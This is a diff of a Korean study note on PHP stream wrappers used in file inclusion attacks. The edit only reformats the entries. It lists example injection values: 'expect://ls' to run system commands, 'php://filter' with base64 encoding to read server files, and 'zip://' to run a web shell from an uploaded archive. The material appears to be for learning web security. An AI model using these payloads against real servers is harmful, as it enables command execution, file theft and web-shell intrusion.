@@ -78,19 +78,19 @@ PHP에서는 **Wrapper**를 이용하여 **파일 읽기** 외에도 다른 기�
 
 #### **일반적인 PHP Wrapper**
 
-* system command를 실행시켜 준다
+* expect//: system command를 실행시켜 준다
 ```
-expect://  :  ?page_num=expect://ls
-```
-
-* encode / decode 옵션으로 서버 안에 존재하는 문서를 열람할 수 있다.
-```
-php://filter : ?page_num=php://filter/convert.base64-encode/resource=[목적 파일]       (base64로 인코딩하여 확인)
+  ?page_num=expect://ls
 ```
 
-* zip파일의 압축을 풀고 해당파일을 실행한다(웹쉘 응용)
+* php://filter: encode / decode 옵션으로 서버 안에 존재하는 문서를 열람할 수 있다.
 ```
-zip://        :  ?page_num=zip://file.zip#web_shell.php
+?page_num=php://filter/convert.base64-encode/resource=[목적 파일]       (base64로 인코딩하여 확인)
+```
+
+* zip://: zip파일의 압축을 풀고 해당파일을 실행한다(웹쉘 응용)
+```
+?page_num=zip://file.zip#web_shell.php
 ```
 
 ---
